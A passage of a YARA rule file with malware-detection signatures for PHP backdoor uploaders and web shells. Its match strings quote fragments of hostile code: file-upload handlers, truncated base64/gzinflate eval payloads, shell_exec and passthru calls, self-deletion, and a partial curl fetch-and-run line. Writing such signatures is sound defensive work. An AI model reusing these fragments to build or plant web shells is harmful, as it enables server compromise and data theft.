        $trigger = "if($dir=='ok'){$ndir=dirname(__FILE__).'/';}else{$ndir=$_SERVER['DOCUMENT_ROOT'].$dir;}"
    condition:
        $trigger and PR01648
}

rule php_backdoor_uploader_177 : backdoor
{
    strings:
        $trigger = "var_dump(move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],'../' . $_FILES[\"file\"]['name']));"
    condition:
        $trigger
}

private rule PR02918 : trigger
{
    strings:
        $ps0 = "echo '#Fail';"
    condition:
        $ps0
}

rule php_backdoor_uploader_178 : backdoor
{
    strings:
        $trigger = "if(move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"../assets/carousel/\".$_POST[\"filename\"]))"
    condition:
        $trigger and PR02918
}

private rule PR02919 : trigger
{
    strings:
        $ps0 = "echo \"<script>alert('uploaded :D')</script>\";"
    condition:
        $ps0
}

private rule PR02920 : trigger
{
    strings:
        $ps0 = "Upload Files:"
    condition:
        $ps0
}

rule php_backdoor_uploader_179 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR02919 and PR01648 and PR02920
}

rule php_backdoor_uploader_180 : backdoor
{
    strings:
        $trigger = "echo \"Rand(100-100): \" . \"\" . $_FILES[\"file\"][\"name\"];"
    condition:
        $trigger and PR01648
}

private rule PR02921 : trigger
{
    strings:
        $ps0 = "move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],$dosyaYolu);"
    condition:
        $ps0
}

rule php_backdoor_uploader_181 : backdoor
{
    strings:
        $trigger = "GIF89"
    condition:
        $trigger and PR02921
}

private rule PR02922 : trigger
{
    strings:
        $ps0 = "echo \"Upload: \" . $_FILES[\"file\"][\"name\"]"
    condition:
        $ps0
}

rule php_backdoor_uploader_182 : backdoor
{
    strings:
        $trigger = "echo $_FILES[\"file\"][\"name\"] . \" already exists. \";"
    condition:
        $trigger and PR02922 and PR01648
}

rule php_backdoor_uploader_183 : backdoor
{
    strings:
        $trigger = "Devs Hidden Uploader"
    condition:
        $trigger and PR02922 and PR01648
}

private rule PR02923 : trigger
{
    strings:
        $ps0 = "echo \"Upload: \""
    condition:
        $ps0
}

private rule PR02924 : trigger
{
    strings:
        $ps0 = "echo \"<body bgcolor="
    condition:
        $ps0
}

rule php_backdoor_uploader_184 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR02923 and PR01648 and PR02924
}

private rule PR02925 : trigger
{
    strings:
        $ps0 = "echo \" Tools\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_185 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR02925 and PR02924
}

private rule PR02926 : trigger
{
    strings:
        $ps0 = "echo \"Stored in: \" . $_FILES[\"file\"][\"name\"];"
    condition:
        $ps0
}

rule php_backdoor_uploader_186 : backdoor
{
    strings:
        $trigger = "if(!empty($_POST)&&$_GET"
    condition:
        $trigger and PR02926 and PR02922 and PR01648
}

private rule PR02927 : trigger
{
    strings:
        $ps0 = "$result=unlink(\"upf.php\");"
    condition:
        $ps0
}

rule php_backdoor_uploader_187 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR02927 and PR01648 and PR01021
}

private rule PR02928 : trigger
{
    strings:
        $ps0 = "echo \"Anjing, upload gagal !\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_188 : backdoor
{
    strings:
        $trigger = "GIF89"
    condition:
        $trigger and PR01648 and PR02928
}

private rule PR02929 : trigger
{
    strings:
        $ps0 = "if(!Check25Port())"
    condition:
        $ps0
}

rule php_backdoor_uploader_189 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR02929 and PR01021
}

private rule PR02930 : trigger
{
    strings:
        $ps0 = "get_magic_quotes_gpc"
    condition:
        $ps0
}

private rule PR02931 : trigger
{
    strings:
        $ps0 = "md5($_POST['pwd'])"
    condition:
        $ps0
}

rule php_backdoor_uploader_190 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR02930 and PR02931
}

private rule PR02932 : trigger
{
    strings:
        $ps0 = "[\"pass\"]) && ($_"
    condition:
        $ps0
}

rule php_backdoor_uploader_191 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR02932 and PR01648 and PR01021
}

private rule PR02933 : trigger
{
    strings:
        $ps0 = "if ($_POST['pass'] == $pass) {$_SESSION['pass'] = $pass;"
    condition:
        $ps0
}

rule php_backdoor_uploader_192 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR02933
}

private rule PR02934 : trigger
{
    strings:
        $ps0 = "if(isset($_POST['pw'])&&$_POST['pw']=="
    condition:
        $ps0
}

rule php_backdoor_uploader_193 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR02934
}

rule php_backdoor_uploader_194 : backdoor
{
    strings:
        $trigger = "){echo \"special\"; move_uploaded_file($_FILES["
    condition:
        $trigger
}

rule php_backdoor_uploader_195 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('bVNhb9owEP1cfsXJQyJIJemqaVKBZO1ESqnKSgOlHVkUObEh3pw4ShwGqvjvcxJW0VJLUe"
    condition:
        $trigger
}

rule php_backdoor_uploader_196 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('HVlFDsTIFb1KdpmRF2ZSYGRmu82wiczsNtPp08ne0q/69VD+69///Ot"
    condition:
        $trigger
}

private rule PR02935 : trigger
{
    strings:
        $ps0 = "7T39X9pI8z8//Xz6P2xTvhc4kfCmrSKctmq1tdWK1uuLD5eQAGkDiUkAqef//p3Z3SSbEFDsy7X3FO5qkp2dmZ2dnZ2Z3"
    condition:
        $ps0
}

rule php_backdoor_uploader_197 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR02935
}

rule php_backdoor_uploader_198 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('FZlHEoPYFUW34pm7iwEiQzl0kXPOTFxkkXNcvdULECX+f+/ec6S//vvvv/5Rnmn"
    condition:
        $trigger
}

rule php_backdoor_uploader_199 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('FZlFEoRYFkW3UrOuDgZoItFSgbs7kw4cEndZfWflBoD/37v3nMi//vvvv/4oz7T"
    condition:
        $trigger
}

rule php_backdoor_uploader_200 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(\"7X37V9tI0ujP7DnzP3Q0/kb2xBjbkEwC2ITwSEgIMBjIi1xWlmVbQbY8kswjWf73W1X9lC"
    condition:
        $trigger
}

rule php_backdoor_uploader_201 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('FZjXDoPYGYRfJXe7ERf0piS7ovdmOjcRYHrv5enjYCFZMkKcwz8z3/jvv/799z+"
    condition:
        $trigger
}

rule php_backdoor_uploader_202 : backdoor
{
    strings:
        $trigger = "ZZJZq5tAGIbvz68IZSAthwNR45IehqLGNZpEk7jdhKqJx13HJeqv70BvCr0bZnm/h+cdoEf2kD2b3ohXcL"
    condition:
        $trigger and PR00029 and PR01436
}

rule php_backdoor_uploader_203 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('pVNdi9swEHw/uP+wEQbFkCZpy0G5x"
    condition:
        $trigger
}

rule php_backdoor_uploader_204 : backdoor
{
    strings:
        $trigger = ";eval(gzinflate(base64_decode(rawurldecode(${$"
    condition:
        $trigger
}

rule php_backdoor_uploader_205 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('hVhrc+JGFv3srdr/4FRNBZx1JXqgYanEW8uCxpZx"
    condition:
        $trigger
}

rule php_backdoor_uploader_206 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('7L0HYBxJliUmL23Ke39K9UrX4HShCI"
    condition:
        $trigger
}

rule php_backdoor_uploader_207 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('3X1rcyPJceBnKkL/oQcLbQO7IF4kZ4bEkDMcksPhLIfk"
    condition:
        $trigger
}

private rule PR02936 : trigger
{
    strings:
        $ps0 = "echo \"testtrue\";"
    condition:
        $ps0
}

private rule PR02937 : trigger
{
    strings:
        $ps0 = "\"hello\""
    condition:
        $ps0
}

rule php_backdoor_uploader_208 : backdoor
{
    strings:
        $trigger = "$_GET[\"test\"]"
    condition:
        $trigger and PR02936 and PR02870 and PR02937 and PR01648
}

private rule PR02938 : trigger
{
    strings:
        $ps0 = "{echo 'ok';}"
    condition:
        $ps0
}

rule php_backdoor_uploader_209 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR02938 and PR01648
}

private rule PR02939 : trigger
{
    strings:
        $ps0 = "eval(base64_decode('JElJSUlJSUlJSWxsbD0nY3VybF9jbG9zZ"
    condition:
        $ps0
}

rule php_backdoor_uploader_210 : backdoor
{
    strings:
        $trigger = "$II"
    condition:
        $trigger and PR02939 and PR01431
}

rule php_backdoor_uploader_211 : backdoor
{
    strings:
        $trigger = "SECURITYHELL.INFO // Upload SCRIPT"
    condition:
        $trigger and PR01648
}

private rule PR02940 : trigger
{
    strings:
        $ps0 = "echo \"The file \".  basename( $_FILES['uploaded_file']['name'])."
    condition:
        $ps0
}

rule php_backdoor_uploader_212 : backdoor
{
    strings:
        $trigger = "move_uploaded_file"
    condition:
        $trigger and PR02940
}

rule php_backdoor_uploader_213 : backdoor
{
    strings:
        $trigger = "@copy($formfile,$tofile);chmod($tofile,"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_214 : backdoor
{
    strings:
        $trigger = "base64_decode"
        $php_backdoor_uploader_214_r0 = /\$\w+\s*=\s*.ZXZhbChvcGVuc3NsX2RlY3J5cHQo[^;]+;\s*eval\(base64_decode\(\$\w+\)\)\s*;/
    condition:
        $trigger and PR00029 and $php_backdoor_uploader_214_r0
}

private rule PR02941 : trigger
{
    strings:
        $ps0 = "id=k value=upload><br>\";"
    condition:
        $ps0
}

private rule PR02942 : trigger
{
    strings:
        $ps0 = "echo \"<br/><br/>Command:<br/>\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_215 : backdoor
{
    strings:
        $trigger = "echo\"<br><form method=post enctype=multipart/"
    condition:
        $trigger and PR01382 and PR02941 and PR02942
}

private rule PR02943 : trigger
{
    strings:
        $ps0 = "echo\"<br><form method=post enctype=multipart/"
    condition:
        $ps0
}

private rule PR02944 : trigger
{
    strings:
        $ps0 = "$disable_functions = @ini_get(\"disable_functions\");"
    condition:
        $ps0
}

rule php_backdoor_uploader_215_02 : backdoor
{
    strings:
        $trigger = "Gagal"
    condition:
        $trigger and PR01382 and PR02941 and PR02943 and PR02944
}

private rule PR02945 : trigger
{
    strings:
        $ps0 = "echo print Shell_Exec('uname -a');"
    condition:
        $ps0
}

rule php_backdoor_uploader_215_03 : backdoor
{
    strings:
        $trigger = "echo \"Uname :\";"
    condition:
        $trigger and PR01382 and PR02941 and PR02943 and PR02945
}

rule php_backdoor_uploader_215_04 : backdoor
{
    strings:
        $trigger = ">404"
    condition:
        $trigger and PR01382 and PR02941 and PR02943 and PR02944
}

private rule PR02946 : trigger
{
    strings:
        $ps0 = "echo\"<font color=#ffffff>\".php_uname().\"\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_215_05 : backdoor
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR02941 and PR02946 and PR02943
}

private rule PR02947 : trigger
{
    strings:
        $ps0 = "die(\"ERROR: 7 UNKNOWN"
    condition:
        $ps0
}

rule php_backdoor_uploader_216 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR02947 and PR00357
}

rule php_backdoor_uploader_217 : backdoor
{
    strings:
        $trigger = "JGNvbnRlbnQ9c3ByaW50ZignPElmTW9kdWxlJXNtb2RfJy4ncmV3cml0ZS5jPiVzUmV3cmknLid0ZUVuZ2lu"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_backdoor_uploader_218 : backdoor
{
    strings:
        $trigger = ";$path=str_replace(\"up.php\",$_FILES[\"file\"][\"name\"],$url);echo\"Go here : \".$path.\"<br>\";"
    condition:
        $trigger and PR01648
}

rule php_backdoor_uploader_219 : backdoor
{
    strings:
        $trigger = "md5($_POST['joomla_pass']"
    condition:
        $trigger
}

private rule PR02948 : trigger
{
    strings:
        $ps0 = "@unlink(__FILE__);"
    condition:
        $ps0
}

rule php_backdoor_uploader_221 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02948 and PR01392
}

rule php_backdoor_uploader_222 : backdoor
{
    strings:
        $trigger = "if(move_uploaded_file($_FILES['uf']['tmp_name'],$uf)) echo $uf;"
    condition:
        $trigger
}

private rule PR02949 : trigger
{
    strings:
        $ps0 = "echo \"<h2>Successfully Uploaded Images"
    condition:
        $ps0
}

rule php_backdoor_uploader_223 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR02949
}

rule php_backdoor_uploader_224 : backdoor
{
    strings:
        $trigger = "CmlmKCFkZWZpbmVkKCJQSFBfRU9MIikpCnsKICAgIGRlZmluZSgiUEhQX0VPT"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR02950 : trigger
{
    strings:
        $ps0 = "Il09PXVwKXtpZihAY29weSgkX0ZJTEVTWyJmIl1bInRtcF9uYW1lIl0sJF9GSUxFU1siZiJdWyJuYW1lIl0pKXtlY2hvIjxiPn"
    condition:
        $ps0
}

private rule PR02951 : trigger
{
    strings:
        $ps0 = "aWYoaXNzZXQoJF9HRVRb"
    condition:
        $ps0
}

rule php_backdoor_uploader_225 : backdoor
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR02950 and PR02951
}

private rule PR02952 : trigger
{
    strings:
        $ps0 = "] Anon Aplha File Uploader ["
    condition:
        $ps0
}

rule php_backdoor_uploader_226 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR02952
}

private rule PR02953 : trigger
{
    strings:
        $ps0 = "if($system == 'pro'){"
    condition:
        $ps0
}

rule php_backdoor_uploader_227 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR02953
}

rule php_backdoor_uploader_228 : backdoor
{
    strings:
        $trigger = "<?php file_put_contents($_POST['error'],$_POST['details']);"
    condition:
        $trigger
}

private rule PR02954 : trigger
{
    strings:
        $ps0 = "{echo 'ok';"
    condition:
        $ps0
}

private rule PR02955 : trigger
{
    strings:
        $ps0 = "{header('Location: .."
    condition:
        $ps0
}

rule php_backdoor_uploader_229 : backdoor
{
    strings:
        $trigger = "$fp=fopen($_POST['path'],"
    condition:
        $trigger and PR02954 and PR02955
}

rule php_backdoor_uploader_230 : backdoor
{
    strings:
        $trigger = "exec('if curl 127.0.0.1 -o /dev/null 2>/dev/null; then curl -o - http"
    condition:
        $trigger
}

private rule PR02956 : trigger
{
    strings:
        $ps0 = "<?php if(isset($_FILES[\"userfile\"][\"name\"])){ $uploaddir = getcwd()"
    condition:
        $ps0
}

rule php_backdoor_uploader_231 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00507 and PR02956
}

rule php_backdoor_uploader_232 : backdoor
{
    strings:
        $trigger = "error_reporting(0); $wp_db_update = strrev("
    condition:
        $trigger
}

rule php_backdoor_uploader_233 : backdoor
{
    strings:
        $trigger = "echo \"Upload Successful"
    condition:
        $trigger and PR02458 and PR00507
}

private rule PR02957 : trigger
{
    strings:
        $ps0 = "<form action=\"<?php echo $_SERVER['PHP_SELF'].'?Nfiles='.$Nfiles; ?>\" method=\"post"
    condition:
        $ps0
}

rule php_backdoor_uploader_234 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR02957
}

rule php_backdoor_uploader_235 : backdoor
{
    strings:
        $trigger = "echo \"AnonymousFox"
    condition:
        $trigger and PR01837
}

private rule PR02958 : trigger
{
    strings:
        $ps0 = ");pcntl_exec("
    condition:
        $ps0
}

private rule PR02959 : trigger
{
    strings:
        $ps0 = ");passthru("
    condition:
        $ps0
}

rule php_backdoor_uploader_236 : backdoor
{
    strings:
        $trigger = ");shell_exec("
    condition:
        $trigger and PR02015 and PR02958 and PR02451 and PR02959
}

private rule PR02960 : trigger
{
    strings:
        $ps0 = "Bantai !\\\"> </form>\"; if ($_FILES[\"file\"][\"error\"] > 0) { echo"
    condition:
        $ps0
}

rule php_backdoor_uploader_237 : backdoor
{
    strings:
        $trigger = "echo \"Error: \" . $_FILES[\"file\"][\"error\"]"
    condition:
        $trigger and PR01648 and PR02960
}

private rule PR02961 : trigger
{
    strings:
        $ps0 = "if(isset($_REQUEST['edit']) && $_REQUEST['edit']=='file"
    condition:
        $ps0
}

private rule PR02962 : trigger
{
    strings:
        $ps0 = "if((@preg_match(\"/system\\((.*?)\\)/\", $op))&&(@preg_match(\"/<pre>"
    condition:
        $ps0
}

rule php_backdoor_uploader_238 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR02961 and PR02962
}

private rule PR02963 : trigger
{
    strings:
        $ps0 = "echo @serialize(Array("
    condition:
        $ps0
}

private rule PR02964 : trigger
{
    strings:
        $ps0 = "=> @phpversion(),"
    condition:
        $ps0
}

rule php_backdoor_uploader_239 : backdoor
{
    strings:
        $trigger = ". '/*', GLOB_ONLYDIR);"
    condition:
        $trigger and PR00732 and PR02963 and PR02964
}

private rule PR02965 : trigger
{
    strings:
        $ps0 = "$wsonames = array('lndex"
    condition:
        $ps0
}

rule php_backdoor_uploader_240 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02965 and PR01445
}

private rule PR02966 : trigger
{
    strings:
        $ps0 = "file_get_contents($cgi);"
    condition:
        $ps0
}

private rule PR02967 : trigger
{
    strings:
        $ps0 = "file_get_contents($htaccess);"
    condition:
        $ps0
}

rule php_backdoor_uploader_241 : backdoor
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR02966 and PR00355 and PR02967
}

private rule PR02968 : trigger
{
    strings:
        $ps0 = "Client has been activated!"
    condition:
        $ps0
}

rule php_backdoor_uploader_242 : backdoor
{
    strings:
        $trigger = "mkdir($dir_path, 0777);"
    condition:
        $trigger and PR00203 and PR02968
}

private rule PR02969 : trigger
{
    strings:
        $ps0 = "@file_get_contents(str_rot13("
    condition:
        $ps0
}

rule php_backdoor_uploader_243 : backdoor
{
    strings:
        $trigger = "@filemtime"
    condition:
        $trigger and PR02969
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_244 : backdoor
{
    strings:
        $trigger = "copy($_FILES"
        $php_backdoor_uploader_244_r0 = /error_reporting\(0\);(\s*echo\(['\"]\S+['\"]\)\s*;)?[\s]*if\(isset\(\$_(REQUEST|POST|GET)\[[^]]+\]\)\)[\s]*\{[\s]*echo[\s]*.<form[^}]+copy\(\$_FILES..file.\]\[.tmp_name/
    condition:
        $trigger and PR02787 and $php_backdoor_uploader_244_r0
}

private rule PR02970 : trigger
{
    strings:
        $ps0 = "implode(\"\\n\",file($_GET["
    condition:
        $ps0
}

rule php_backdoor_uploader_245 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02027 and PR02970 and PR02028
}

private rule PR02971 : trigger
{
    strings:
        $ps0 = "->dispatch('GIF89alxWam9FZlRWYvxGc19VZ29Wb');"
    condition:
        $ps0
}

rule php_backdoor_uploader_246 : backdoor
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR02971
}

rule php_backdoor_uploader_247 : backdoor
{
    strings:
        $trigger = "file_put_contents($_POST['error'],$_POST['details"
    condition:
        $trigger
}

private rule PR02972 : trigger
{
    strings:
        $ps0 = "echo $status;"
    condition:
        $ps0
}

private rule PR02973 : trigger
{
    strings:
        $ps0 = "ini_set('upload_max_filesize"
    condition:
        $ps0
}

rule php_backdoor_uploader_248 : backdoor
{
    strings:
        $trigger = "$status = \"Archivo subido: \".$archivo.\"\";"
    condition:
        $trigger and PR02972 and PR02388 and PR02973
}

rule php_backdoor_uploader_249 : backdoor
{
    strings:
        $trigger = "){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){echo"
    condition:
        $trigger and PR02787
}

rule php_backdoor_uploader_249_02 : backdoor
{
    strings:
        $trigger = "error_reporting(0);chmod(basename($_SERVER[\"PHP_SELF\"]), 0444);"
    condition:
        $trigger and PR02787 and PR02388
}

rule php_backdoor_uploader_249_03 : backdoor
{
    strings:
        $trigger = "$body=(\"Shell: http:"
    condition:
        $trigger and PR02787 and PR00301 and PR02388
}

private rule PR02974 : trigger
{
    strings:
        $ps0 = "<head><title>Uploader v"
    condition:
        $ps0
}

rule php_backdoor_uploader_250 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR02974 and PR01648 and PR01021
}

private rule PR02975 : trigger
{
    strings:
        $ps0 = "= implode(array_map('chr',array(98,97,115,101,54,52,95,100,101,99,111,100,101)"
    condition:
        $ps0
}

rule php_backdoor_uploader_251 : backdoor
{
    strings:
        $trigger = "strrev(str_replace('^','=',substr($"
    condition:
        $trigger and PR02975 and PR01431
}

rule php_backdoor_uploader_252 : backdoor
{
    strings:
        $trigger = ">\"; } echo \"Uploader By"
    condition:
        $trigger and PR02880
}

rule php_backdoor_uploader_254 : backdoor
{
    strings:
        $trigger = "echo \"<br><br><a href=\\\"{$_FILES[\"userfile\"][\"name\"]}\\\" TARGET=_BLANK>{$_FILES["
    condition:
        $trigger and PR02458 and PR00507
}

private rule PR02976 : trigger
{
    strings:
        $ps0 = "$_SERVER[SCRIPT_FILENAME]; touch/*;*/($filename, $time);} ?>\\'); /*');"
    condition:
        $ps0
}

rule php_backdoor_uploader_255 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR02976 and PR01648 and PR01021
}

rule php_backdoor_uploader_256 : backdoor
{
    strings:
        $trigger = "echo \"<form method='post' action='' enctype='multipart/form-data'><select name="
    condition:
        $trigger and PR02887
}

private rule PR02977 : trigger
{
    strings:
        $ps0 = "=dirname(__FILE__);"
    condition:
        $ps0
}

private rule PR02978 : trigger
{
    strings:
        $ps0 = "JHVybDliID0gJG"
    condition:
        $ps0
}

rule php_backdoor_uploader_257 : backdoor
{
    strings:
        $trigger = "$codelock_enc="
    condition:
        $trigger and PR02977 and PR02534 and PR02978
}

private rule PR02979 : trigger
{
    strings:
        $ps0 = "function tcget($"
    condition:
        $ps0
}

rule php_backdoor_uploader_258 : backdoor
{
    strings:
        $trigger = "&& isset($recover_file) && isset($recover_file_url)){"
    condition:
        $trigger and PR00435 and PR02979
}

private rule PR02980 : trigger
{
    strings:
        $ps0 = "Auto Xploiter\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_259 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02507 and PR00507 and PR02980
}

private rule PR02981 : trigger
{
    strings:
        $ps0 = "Auto Xploiter"
    condition:
        $ps0
}

private rule PR02982 : trigger
{
    strings:
        $ps0 = "(isset($_GET[\"oak\"]"
    condition:
        $ps0
}

rule php_backdoor_uploader_259_02 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02507 and PR00507 and PR02981 and PR02982
}

private rule PR02983 : trigger
{
    strings:
        $ps0 = "if($Mo == 'Mo'){"
    condition:
        $ps0
}

rule php_backdoor_uploader_260 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR02983
}

rule php_backdoor_uploader_261 : backdoor
{
    strings:
        $trigger = "explode('{||}', get_web_page("
    condition:
        $trigger and PR00435 and PR00341
}

private rule PR02984 : trigger
{
    strings:
        $ps0 = "@unlink($"
    condition:
        $ps0
}

private rule PR02985 : trigger
{
    strings:
        $ps0 = "($_REQUEST[chr("
    condition:
        $ps0
}

rule php_backdoor_uploader_262 : backdoor
{
    strings:
        $trigger = "@array_diff_ukey(@array("
    condition:
        $trigger and PR02984 and PR02252 and PR02985
}

rule php_backdoor_uploader_263 : backdoor
{
    strings:
        $trigger = "eval(htmlspecialchars_decode(gzinflate(base64_decode($"
    condition:
        $trigger and PR00634
}

private rule PR02986 : trigger
{
    strings:
        $ps0 = "<b><u>$web"
    condition:
        $ps0
}

private rule PR02987 : trigger
{
    strings:
        $ps0 = "if(@copy($_FILES["
    condition:
        $ps0
}

private rule PR02988 : trigger
{
    strings:
        $ps0 = "if(is_writable($root))"
    condition:
        $ps0
}

rule php_backdoor_uploader_264 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02986 and PR00507 and PR02987 and PR02988
}

private rule PR02989 : trigger
{
    strings:
        $ps0 = "foreach ($GLOBALS[\"writable_dirs\"] as $wdir)"
    condition:
        $ps0
}

rule php_backdoor_uploader_266 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02989 and PR01431
}

private rule PR02990 : trigger
{
    strings:
        $ps0 = "if(@$_GET[\"mygodra\"]){echo '<!--MYGODRA-->"
    condition:
        $ps0
}

rule php_backdoor_uploader_267 : backdoor
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR02990
}

private rule PR02991 : trigger
{
    strings:
        $ps0 = "$indexcode);@touch($"
    condition:
        $ps0
}

rule php_backdoor_uploader_268 : backdoor
{
    strings:
        $trigger = "echo 'indexcode not ok"
    condition:
        $trigger and PR00435 and PR02991 and PR00341
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_269 : backdoor
{
    strings:
        $trigger = "file_put_contents("
        $php_backdoor_uploader_269_r0 = /if\(@?\$_GET\[..x...\]\)[\s]*\{[\s]*@move_uploaded_file\(\$_FILES\[..x...\]/
    condition:
        $trigger and PR01332 and $php_backdoor_uploader_269_r0
}

private rule PR02992 : trigger
{
    strings:
        $ps0 = "pathinfo($target_file,PATHINFO_EXTENSION);"
    condition:
        $ps0
}

private rule PR02993 : trigger
{
    strings:
        $ps0 = "$target_dir"
    condition:
        $ps0
}

private rule PR02994 : trigger
{
    strings:
        $ps0 = "<form action="
    condition:
        $ps0
}

private rule PR02995 : trigger
{
    strings:
        $ps0 = "if(move_uploaded_file("
    condition:
        $ps0
}

private rule PR02996 : trigger
{
    strings:
        $ps0 = "$uploadOk"
    condition:
        $ps0
}

rule php_backdoor_uploader_270 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR02992 and PR02993 and PR02994 and PR01021 and PR02995 and PR02996
}

private rule PR02997 : trigger
{
    strings:
        $ps0 = "<title>\xd0\x97\xd0\xb0\xd0\xb3\xd1\x80\xd1\x83\xd0\xb7\xd0\xba\xd0\xb0 \xd1\x84\xd0\xb0\xd0\xb9\xd0\xbb\xd0\xbe\xd0\xb2 \xd0\xbd\xd0\xb0 \xd1\x81\xd0\xb5\xd1\x80\xd0\xb2\xd0\xb5\xd1\x80</title>"
    condition:
        $ps0
}

rule php_backdoor_uploader_272 : backdoor
{
    strings:
        $trigger = "exit;"
    condition:
        $trigger and PR00039 and PR02056 and PR02997
}

private rule PR02998 : trigger
{
    strings:
        $ps0 = "<b>GAGAL"
    condition:
        $ps0
}

private rule PR02999 : trigger
{
    strings:
        $ps0 = "Uploader</title>"
    condition:
        $ps0
}

rule php_backdoor_uploader_273 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR02998 and PR02999 and PR00507
}

private rule PR03000 : trigger
{
    strings:
        $ps0 = "(isset($_POST['username']) && md5($_POST['username'])"
    condition:
        $ps0
}

private rule PR03001 : trigger
{
    strings:
        $ps0 = ".'init';"
    condition:
        $ps0
}

private rule PR03002 : trigger
{
    strings:
        $ps0 = "$url = $_POST['from'];"
    condition:
        $ps0
}

rule php_backdoor_uploader_274 : backdoor
{
    strings:
        $trigger = "$_POST['where'].$_POST['name'], 'w');"
    condition:
        $trigger and PR03000 and PR03001 and PR03002
}

private rule PR03003 : trigger
{
    strings:
        $ps0 = "echo \"Go COPY from \".$url.\" to \".$_GET['n'].\".zip\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_275 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03003
}

private rule PR03004 : trigger
{
    strings:
        $ps0 = "echo dirname(__FILE__);"
    condition:
        $ps0
}

rule php_backdoor_uploader_276 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR03004 and PR01648
}

private rule PR03005 : trigger
{
    strings:
        $ps0 = "function http_get($url)"
    condition:
        $ps0
}

rule php_backdoor_uploader_277 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03005 and PR01362 and PR00719
}

private rule PR03006 : trigger
{
    strings:
        $ps0 = "ini_get(\"allow_url_fopen\")"
    condition:
        $ps0
}

private rule PR03007 : trigger
{
    strings:
        $ps0 = "\"?pc=\".$"
    condition:
        $ps0
}

private rule PR03008 : trigger
{
    strings:
        $ps0 = "\"../../wp-load.php\");"
    condition:
        $ps0
}

rule php_backdoor_uploader_278 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03006 and PR01428 and PR03007 and PR01021 and PR03008
}

private rule PR03009 : trigger
{
    strings:
        $ps0 = "function dirToArray($dir)"
    condition:
        $ps0
}

private rule PR03010 : trigger
{
    strings:
        $ps0 = "if($_POST['action']=='unlink')"
    condition:
        $ps0
}

private rule PR03011 : trigger
{
    strings:
        $ps0 = "echo get_option(\"siteurl\");"
    condition:
        $ps0
}

rule php_backdoor_uploader_278_02 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03009 and PR03010 and PR03011
}

private rule PR03012 : trigger
{
    strings:
